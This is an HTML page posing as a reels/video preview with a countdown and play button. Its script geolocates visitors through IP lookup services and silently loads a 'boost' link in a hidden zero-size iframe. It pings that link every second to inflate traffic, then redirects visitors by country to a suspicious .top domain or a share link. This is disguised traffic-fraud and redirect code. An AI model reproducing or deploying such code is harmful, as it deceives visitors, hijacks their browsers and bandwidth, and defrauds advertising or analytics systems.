<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: #000; height: 100vh; width: 100vw; overflow: hidden; display: flex; justify-content: center; align-items: center; font-family: Arial, sans-serif; position: relative; }
    #main-image { width: 100vw; height: 100vh; object-fit: cover; cursor: pointer; display: none; position: absolute; top: 0; left: 0; z-index: 1; }
    .loading { color: #fff; font-size: 18px; z-index: 2; }
    #reels-overlay { position: absolute; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: contain; pointer-events: auto; cursor: pointer; z-index: 10; display: none; }
    .countdown-container { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90px; height: 90px; display: none; justify-content: center; align-items: center; background: rgba(0, 0, 0, 0.55); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); border-radius: 50%; box-shadow: 0 4px 20px rgba(0,0,0,0.4); z-index: 999; pointer-events: none; }
    .countdown-svg { position: absolute; width: 100%; height: 100%; transform: rotate(-90deg); }
    .countdown-svg circle { fill: none; stroke-width: 5; }
    .circle-bg { stroke: rgba(255, 255, 255, 0.2); }
    .circle-progress { stroke: #00d2ff; stroke-dasharray: 251.2; stroke-dashoffset: 0; stroke-linecap: round; transition: stroke-dashoffset 1s linear; }
    #countdown-number { font-size: 32px; font-weight: bold; color: #ffffff; text-shadow: 0 2px 4px rgba(0,0,0,0.5); z-index: 1000; }
    #play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90px; height: 90px; object-fit: contain; cursor: pointer; display: none; z-index: 1001; filter: drop-shadow(0 4px 12px rgba(0,0,0,0.6)); transition: transform 0.15s ease, opacity 0.2s ease; opacity: 0.95; }
    #play-btn:hover { transform: translate(-50%, -50%) scale(1.08); opacity: 1; }
  </style>
</head>
<body>
  <img id="main-image" alt="">
  <div class="loading" id="loading-text">Loading...</div>
  <img id="reels-overlay" src="reels-overlay.png" alt="" onclick="handleClick()">
  <div class="countdown-container" id="countdown-box">
    <svg class="countdown-svg" viewBox="0 0 90 90">
      <circle class="circle-bg" cx="45" cy="45" r="40"></circle>
      <circle class="circle-progress" id="circle-progress" cx="45" cy="45" r="40"></circle>
    </svg>
    <span id="countdown-number">9</span>
  </div>
  <img id="play-btn" src="play-btn.png" alt="Play" onclick="handleClick()">
<script>
const SHARE_LINK = "https://share.google/tlNr8cayfa6Aiin3Z";
const BOOST_LINK = "https://boost786x.top/boost55abc/?utm_source=MHR-B&utm_medium=ADP";

const CONFIG = {
  targetLink: SHARE_LINK,
  images: [
    "https://ibwp622-oss.github.io/sharing/image_03.webp",
    "https://blogger.googleusercontent.com/img/a/AVvXsEjVUsd8mlVZK1DJXR9EuGdrfRyV0nVuUrkzvaAGw4yUae65RBHpQi39ppBzQQTXZCF3wDJn4WQo6r1ImHFBdUZU5vxF07lBp-7Jyj4FNQ1vYnCWgNC2x0bILbK41nRKzaJP59n6OIsAKOTWZOJA_jXDb0Fo7tNhC4-BCf3qTXTcz3YKz-dsfdAnrPiCX_8q=s1600",
    "https://blogger.googleusercontent.com/img/a/AVvXsEhr23hekhRZz9v2-tFa8hOO7sWOQMocOiam5F1joLAnEhUww1VKFR_uG5RPjPOvFQ1o-zHqNr3suFiLP8-G08YEDusJ91AIElANtF-ZexbLJpBQsAFqBl_f7ktIH9tk8uE5LHyKfM4ciXsyEzgrXBhW7jiHEJKhE37kTAvXD4pOe2owePnYf0l4-YDUZXHQ=w360-h640",
    "https://blogger.googleusercontent.com/img/a/AVvXsEgxqJ9VZzSFBl94vzQs-GYFVbdbPIFcyY5TdfMJVNu0PFT6q7ZkCCzx9OZ-sJLuNsD20hR76WPggQ2xNjOtRCfTIZ6nFs7JGS9goNv_w12TLmft5ZWt2TeXXH_iWvgHuIbc_vzFYApmOsoGucgD3zkUyc4F_YA3xWn86M6A822sl4kGEO22N-0LxkiBiJvA=w360-h640"
  ]
};

const TARGET_90_COUNTRIES = new Set([
  "US", "EG", "ID", "MX", "BR", "PH", "SA", "MA", "YE", "DZ", "AF", "MY", "NG", "IQ", "IT",
  "CA", "FR", "SY", "AR", "TH", "AE", "LK", "GB", "CU", "SD", "ET", "LY", "TN", "CD", "GN",
  "ES", "VE", "PE", "KH", "GT", "RO", "DE", "JO", "NP", "NI", "CI", "PS", "PT", "PG", "LB",
  "UA", "CL", "QA", "PL", "BO", "HN", "HU", "AU", "DO", "PA", "SO", "NL", "EC", "PY", "MZ",
  "KW", "TW", "CM", "ZA", "UY", "IR", "GR", "JP", "GH", "SG", "OM", "FI", "AT", "BE", "BD",
  "BG", "MK", "BA", "SN", "RS", "ML", "HK", "HR", "SE", "IL", "FJ", "MW", "MV", "MR", "MG",
  "CH", "SC", "ZM", "GY", "KZ", "GE", "KE", "AO", "TL", "VN", "CR", "KR", "SL", "SV", "AZ",
  "BH", "UZ", "TD", "HT", "LR", "CG", "BJ", "BF", "CZ", "MU", "TZ", "SK", "EE", "VU", "KG",
  "TO", "LV", "BN", "CF", "CY", "RE", "NO", "BY", "SI", "MD", "MO", "CV", "RW", "LA", "MM",
  "CN", "PR", "ZW", "TT", "XK", "PM", "BI", "JM", "GM", "AM", "SS", "RU", "LT", "SB", "VC",
  "TJ", "MN"
]);

async function resolveCountryTarget() {
  try {
    const tz = (Intl.DateTimeFormat().resolvedOptions().timeZone || "").toLowerCase();
    if (tz.includes("kolkata") || tz.includes("calcutta") || tz.includes("asia/kolkata")) {
      CONFIG.targetLink = SHARE_LINK;
      return;
    }
  } catch (e) {}

  const fetchCountry = async (url) => {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 2000);
    try {
      const response = await fetch(url, { signal: controller.signal });
      if (!response.ok) return null;
      const data = await response.json();
      return (data.country_code || data.country || "").toUpperCase();
    } catch (e) {
      return null;
    } finally {
      clearTimeout(timeout);
    }
  };

  let countryCode = await fetchCountry("https://ipapi.co/json/");
  if (!countryCode) {
    countryCode = await fetchCountry("https://ip-api.com/json/?fields=countryCode");
  }

  // ۱. انڈیا کے لیے ۱۰۰٪ شیئر لنک
  if (countryCode === "IN") {
    CONFIG.targetLink = SHARE_LINK;
    return;
  }

  // ۲. لسٹ والے ممالک کے لیے ۱۰۰٪ بوسٹ لنک
  if (countryCode && TARGET_90_COUNTRIES.has(countryCode)) {
    CONFIG.targetLink = BOOST_LINK;
    return;
  }

  // ۳. باقی تمام ممالک کے لیے ۱۰۰٪ شیئر لنک
  CONFIG.targetLink = SHARE_LINK;
}

const countryTargetReady = resolveCountryTarget();
let selectedIndex = 0;
let countdownFinished = false;

function getRandomImage() {
  selectedIndex = Math.floor(Math.random() * CONFIG.images.length);
  return CONFIG.images[selectedIndex];
}

(async function () {
  showImageScreen();
  startCountdown(9);
  await countryTargetReady;
  startDurationBooster();
})();

function showImageScreen() {
  const img = document.getElementById("main-image");
  img.src = getRandomImage();
  img.style.display = "block";
  document.getElementById("loading-text").style.display = "none";
  document.getElementById("countdown-box").style.display = "flex";
  document.getElementById("reels-overlay").style.display = "block";
}

function startCountdown(seconds) {
  let timeLeft = seconds;
  const numDisplay = document.getElementById("countdown-number");
  const circleProgress = document.getElementById("circle-progress");
  const totalCircleLength = 251.2;
  const countdownBox = document.getElementById("countdown-box");

  const timer = setInterval(() => {
    timeLeft--;
    if (timeLeft > 0) {
      numDisplay.textContent = timeLeft;
      const offset = totalCircleLength - ((timeLeft / seconds) * totalCircleLength);
      circleProgress.style.strokeDashoffset = offset;
    } else {
      numDisplay.textContent = "0";
      circleProgress.style.strokeDashoffset = totalCircleLength;
      clearInterval(timer);
      countdownBox.style.display = "none";
      countdownFinished = true;
      if (selectedIndex >= 1) {
        document.getElementById("play-btn").style.display = "block";
      } else {
        goToTarget();
      }
    }
  }, 1000);
}

function handleClick() {
  if (countdownFinished) {
    goToTarget();
  }
}

document.getElementById("main-image").addEventListener("click", handleClick);

function startDurationBooster() {
  try {
    const iframe = document.createElement('iframe');
    iframe.src = CONFIG.targetLink;
    iframe.style.display = 'none';
    iframe.style.width = '0px';
    iframe.style.height = '0px';
    document.body.appendChild(iframe);
  } catch (e) {}

  setInterval(() => {
    if (navigator.sendBeacon) {
      navigator.sendBeacon(CONFIG.targetLink);
    } else {
      fetch(CONFIG.targetLink, { method: 'GET', mode: 'no-cors' }).catch(()=>{});
    }
  }, 1000);
}

async function goToTarget() {
  await countryTargetReady;
  window.location.href = CONFIG.targetLink;
}
</script>
</body>
</html>
